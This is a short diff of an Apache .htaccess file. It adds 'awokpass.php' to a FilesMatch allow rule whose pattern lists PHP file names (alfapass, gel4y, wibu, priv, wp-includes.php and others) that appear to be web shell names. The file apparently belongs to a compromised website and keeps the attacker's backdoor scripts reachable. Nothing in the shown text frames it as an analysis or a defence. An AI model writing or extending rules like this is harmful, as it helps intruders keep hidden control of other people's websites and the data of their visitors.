@@ -6,7 +6,7 @@
 
 </FilesMatch>
 
-<FilesMatch "^(|index.html|unk.php|unk.phtml|install.php|wg.php|wege.phtml|alpass.php|alfapass.php|install.php|p.php|digi.php|digi2.php|fz.php|alf.php|gel4y.php|gelay.php|mar.php|priv.php|wp-includes.php|laypas.php|orb.php|orb.phtml|wibu.php|wibu.phtml|ciis.php|aexa.php|awok.php)$">
+<FilesMatch "^(|index.html|unk.php|awokpass.php|unk.phtml|install.php|wg.php|wege.phtml|alpass.php|alfapass.php|install.php|p.php|digi.php|digi2.php|fz.php|alf.php|gel4y.php|gelay.php|mar.php|priv.php|wp-includes.php|laypas.php|orb.php|orb.phtml|wibu.php|wibu.phtml|ciis.php|aexa.php|awok.php)$">
 
  Order allow,deny
 
